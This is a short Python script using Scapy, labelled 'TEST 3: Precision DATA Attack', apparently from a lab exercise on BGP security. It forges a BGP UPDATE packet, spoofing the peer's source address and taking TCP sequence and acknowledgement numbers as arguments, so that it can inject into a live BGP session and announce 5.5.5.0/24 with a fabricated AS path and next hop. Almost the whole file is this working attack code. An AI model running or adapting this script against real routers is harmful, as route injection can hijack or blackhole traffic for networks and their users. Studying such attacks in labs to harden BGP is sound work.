#! /usr/bin/env python
# TEST 3: Precision DATA Attack
# Sends BGP UPDATE packet and updates 5.5.5.0 as a routed path
# python ./ test3 .py ( dstPort ) ( seqNum ) ( ackNum )

import random
from scapy.all import *

load_contrib ('bgp')

srcIP = "100.2.3.2"
dstIP = "100.2.3.1"

srcPort = 179
dstPort = int(sys.argv [1])

seqNum = int(sys.argv [2])
ackNum = int(sys.argv [3])

paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')

# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
paAS = BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x01\x2c')

# Path Next Hop [IP (100.2.3.2)]
paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x64\x02\x03\x02')

# Multiple Exit Discriminator [0000]
paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')
paBGPU = BGPUpdate(tp_len = 25 , total_path = [paORIGIN , paAS , paNEXTHOP , paMED], nlri = [(24 , '5.5.5.0')])

a = IP(dst = dstIP, src = srcIP, ttl = 1)/
	TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum)/
	BGPHeader(len = 52, type = 2)/
	paBGPU

send(a)
